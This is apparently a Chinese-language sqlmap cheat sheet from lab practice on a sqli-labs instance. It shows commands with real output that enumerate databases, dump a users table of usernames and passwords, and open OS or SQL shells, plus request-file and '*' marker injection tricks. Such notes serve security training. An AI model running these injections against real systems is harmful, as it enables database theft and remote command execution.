# SQLMAP

## 基本使用

```
sqlmap -u "http://10.10.10.201:5080/sqlilabs/Less-1/?id=1"

-u 指定测试的url,如果注入点存在，则会返回mysql的版本信息

[23:16:15] [INFO] the back-end DBMS is MySQL
web server operating system: Linux CentOS 6
web application technology: PHP 5.3.3, Apache 2.2.15
back-end DBMS: MySQL >= 5.0

--dbs 查看所有数据库

[00:07:40] [INFO] the back-end DBMS is MySQL
web server operating system: Linux CentOS 6
web application technology: Apache 2.2.15, PHP 5.3.3
back-end DBMS: MySQL >= 5.0
[00:07:40] [INFO] fetching database names
[00:07:40] [INFO] resumed: 'information_schema'
[00:07:40] [INFO] resumed: 'challenges'
[00:07:40] [INFO] resumed: 'mysql'
[00:07:40] [INFO] resumed: 'security'
[00:07:40] [INFO] resumed: 'test'
available databases [5]:                                                                                                                     
[*] challenges
[*] information_schema
[*] mysql
[*] security
[*] test

--current-db 查看当前应用程序所使用的所有数据库

[00:08:27] [INFO] the back-end DBMS is MySQL
web server operating system: Linux CentOS 6
web application technology: Apache 2.2.15, PHP 5.3.3
back-end DBMS: MySQL >= 5.0
[00:08:27] [INFO] fetching current database
current database: 'security'

--columns -D "数据库名" -T "数据表名称"        读取指定数据表中的字段

[00:11:44] [INFO] the back-end DBMS is MySQL
web server operating system: Linux CentOS 6
web application technology: PHP 5.3.3, Apache 2.2.15
back-end DBMS: MySQL >= 5.0
[00:11:44] [INFO] fetching columns for table 'users' in database 'security'
[00:11:44] [INFO] resumed: 'id','int(3)'
[00:11:44] [INFO] resumed: 'username','varchar(20)'
[00:11:44] [INFO] resumed: 'password','varchar(20)'
Database: security                                                                                                                           
Table: users
[3 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int(3)      |
| password | varchar(20) |
| username | varchar(20) |
+----------+-------------+

--dump -C "字段1,字段2,..." -D "数据库名" -T "数据表名称"

[00:14:01] [INFO] the back-end DBMS is MySQL
web server operating system: Linux CentOS 6
web application technology: Apache 2.2.15, PHP 5.3.3
back-end DBMS: MySQL >= 5.0
[00:14:01] [INFO] fetching entries of column(s) 'id,password,username' for table 'users' in database 'security'
[00:14:01] [INFO] retrieved: '1','Dumb','Dumb'
[00:14:01] [INFO] retrieved: '2','I-kill-you','Angelina'
[00:14:01] [INFO] retrieved: '3','p@ssword','Dummy'
[00:14:01] [INFO] retrieved: '4','crappy','secure'
[00:14:01] [INFO] retrieved: '5','stupidity','stupid'
[00:14:01] [INFO] retrieved: '6','genious','superman'
[00:14:01] [INFO] retrieved: '7','mob!le','batman'
[00:14:01] [INFO] retrieved: '8','admin','admin'
[00:14:01] [INFO] retrieved: '9','admin1','admin1'
[00:14:01] [INFO] retrieved: '10','admin2','admin2'
[00:14:01] [INFO] retrieved: '11','admin3','admin3'
[00:14:01] [INFO] retrieved: '12','dumbo','dhakkan'
[00:14:01] [INFO] retrieved: '14','admin4','admin4'
Database: security                                                                                                                           
Table: users
[13 entries]
+----+------------+----------+
| id | password   | username |
+----+------------+----------+
| 1  | Dumb       | Dumb     |
| 2  | I-kill-you | Angelina |
| 3  | p@ssword   | Dummy    |
| 4  | crappy     | secure   |
| 5  | stupidity  | stupid   |
| 6  | genious    | superman |
| 7  | mob!le     | batman   |
| 8  | admin      | admin    |
| 9  | admin1     | admin1   |
| 10 | admin2     | admin2   |
| 11 | admin3     | admin3   |
| 12 | dumbo      | dhakkan  |
| 14 | admin4     | admin4   |
+----+------------+----------+

--privileges -U "用户名"   测试注入点权限

--os-cmd="ifconfig"  执行shell命令
--os-shell           进行交互式shell

--sql-shell          返回交互式shell
--sql-query="sql语句" 执行sql语句

-data ""   POST提交方式

-v         显示详细等级
0:只显示Python的回溯、错误和关键消息;
1:显示信息和警告消息;
2:显示调试消息;
3:有效载荷注入;
4:显示HTTP请求;
5:显示HTTP响应头;
6:显示HTTP响应页面的内容。

-r 文件路径      进行HTTP请求注入
-r http.txt
http.txt文件内容
POST /index.php HTTP/1.1
Host:www.chinaskills.com
User-Aget:Mozilla/5.0

username=admin&password=123456

sqlmap.py -u "http://www.chinaskills.com/2*.html" --dbs ;
有些网站采用了伪静态的页面，这时再使用SQLMap注入则无能为力，因为SQLMap无法识别哪里是对服务器提交的请求参数，所以SQLMap提供“*”参数，将SQL语句插入到指:定位置，这一用法常用于伪静态注入。同样在使用-r参数对HTTP请求注入时，也可以直接在文本中插入*号，如:
POST /index.php HTTP/1.1
Host:www.chinaskills.com
User-Aget:Mozilla/5.0
username=admin*&password=admin888 // 注入username字段

```

